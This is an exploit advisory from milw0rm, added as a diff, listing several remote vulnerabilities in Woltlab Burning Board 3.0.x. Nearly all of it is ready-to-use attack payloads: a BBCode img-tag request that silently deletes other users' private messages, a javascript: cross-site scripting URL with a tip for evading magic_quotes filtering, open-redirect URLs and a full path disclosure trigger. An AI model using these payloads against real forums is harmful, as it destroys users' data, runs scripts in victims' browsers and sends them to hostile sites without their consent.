@@ -1,0 +1,39 @@
++---------------------------------------------------------------------------+
+| Woltlab Burning Board 3.0.x Multiple Remote Vulnerabilities               |
++---------------------------------------------------------------------------+
+| by Juri Gianni aka yeat - staker[at]hotmail[dot]it                        |
+| thanks to s3rg3770                                                        |
++---------------------------------------------------------------------------+
+
+# Vulnerabilities: BBCode IMG / XSS / Delete PM / Full Path Disclosure / URL Redirection
+
+
+# BBCode IMG Tag Script Injection
+# [img]http://[host][/img]
+
+
+# Delete Private Messages (BBCode IMG Tag Script Injection)
+
+# Insert into a (forum message/private message/your signature) the code below:
+# [img]http://[host]/[path]/wbb/index.php?page=PM&action=delete&pmID=[ID]&folderID=0[/img]
+# The fake image doesn't show errors.
+
+
+# Cross Site Scripting 
+
+# http://[host]/[path]/wcf/acp/dereferrer.php?url=javascript:alert("Example");
+# you can bypass the magic_quotes_gpc with String.FromCharCode function.
+
+
+# URL Redirection
+
+# http://[host]/[path]/wcf/acp/dereferrer.php?url=http://[host]
+# http://[host]/[path]/wbb/?page=ThreadAction&action=deleteAll&boardID=1&url=[local URL]
+
+
+# Full Path Discloscure 
+
+# http://[host]/[path]/wbb/index.php?page=[]
+# it works on < 3.0.8 version only.
+
+# milw0rm.com [2009-03-09]
